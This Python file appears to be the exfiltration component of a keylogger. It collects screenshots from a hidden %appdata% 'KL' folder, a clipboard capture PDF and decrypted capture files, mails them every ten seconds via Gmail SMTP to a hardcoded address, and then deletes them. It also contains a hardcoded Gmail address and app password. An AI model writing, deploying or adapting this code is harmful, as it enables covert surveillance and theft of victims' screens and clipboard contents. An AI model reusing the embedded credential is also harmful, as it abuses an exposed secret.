import logging
import traceback
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from concurrent.futures import ThreadPoolExecutor
import os
import time
from encrypt_and_decrypt import decrypt_files

# Configure logging
logging.basicConfig(
    filename=os.path.join(os.environ['appdata'], "email_debug.log"),
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Configurations
email_address = "test123.moali@gmail.com"
password = "bevnfpjwkmodnuln"
toaddr = "test123.moali@gmail.com"
screenshot_folder = os.path.join(os.environ['appdata'], "KL")
clipboard_pdf_file = os.path.join(screenshot_folder, "clipboard.pdf")


def send_email(subject, body, file_paths):
    """Send an email with optional file attachments."""
    try:
        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = toaddr
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        # Attach files
        for file_path in file_paths:
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        mime_base = MIMEBase('application', 'octet-stream')
                        mime_base.set_payload(f.read())
                        encoders.encode_base64(mime_base)
                        mime_base.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file_path)}")
                        msg.attach(mime_base)
                except Exception as e:
                    logging.error(f"Error attaching file {file_path}: {e}")
            else:
                logging.warning(f"File does not exist: {file_path}")

        # Send email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(email_address, password)
            server.sendmail(email_address, toaddr, msg.as_string())
            logging.info("Email sent successfully.")

        # Delete attached files after sending
        for file_path in file_paths:
            if os.path.exists(file_path):
                os.remove(file_path)
                logging.info(f"File deleted after email sent: {file_path}")

    except Exception as e:
        logging.error(f"Error sending email: {traceback.format_exc()}")


def get_screenshot_files():
    """Retrieve all screenshot files from the folder."""
    try:
        screenshot_files = [
            os.path.join(screenshot_folder, file)
            for file in os.listdir(screenshot_folder)
            if file.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp', '.gif'))
        ]
        logging.info(f"Found {len(screenshot_files)} screenshot(s).")
        return screenshot_files
    except Exception as e:
        logging.error(f"Error retrieving screenshot files: {e}")
        return []


def send_screenshots_email():
    """Send an email with screenshots as attachments."""
    screenshot_files = get_screenshot_files()
    if not screenshot_files:
        logging.info("No screenshots to send.")
    send_email("Screenshots", "Here are the screenshots.", screenshot_files)


def send_encrypted_files_email():
    """Send an email with encrypted files and clipboard PDF."""
    file_paths = []

    try:
        # Decrypt files before sending
        decrypted_files = decrypt_files()
        logging.info(f"Decrypted files: {decrypted_files}")

        # Include clipboard PDF
        if os.path.exists(clipboard_pdf_file):
            file_paths.append(clipboard_pdf_file)

        # Include decrypted files
        for file in decrypted_files:
            if os.path.exists(file):
                file_paths.append(file)

        if not file_paths:
            logging.info("No files to attach. Sending empty notification.")
            send_email("Encrypted Files and Clipboard PDF", "No files are available for attachment.", [])
        else:
            send_email("Encrypted Files and Clipboard PDF", "Here are the encrypted files and clipboard PDF.", file_paths)

    except Exception as e:
        logging.error(f"Error preparing encrypted files email: {traceback.format_exc()}")


def send_emails_periodically():
    """Send periodic emails with screenshots and encrypted files."""
    while True:
        try:
            send_screenshots_email()
            send_encrypted_files_email()
            time.sleep(10)  # Wait for 10 seconds before the next cycle
        except Exception as e:
            logging.error(f"Error in periodic email sending: {traceback.format_exc()}")
            time.sleep(10)


if __name__ == "__main__":
    send_emails_periodically()
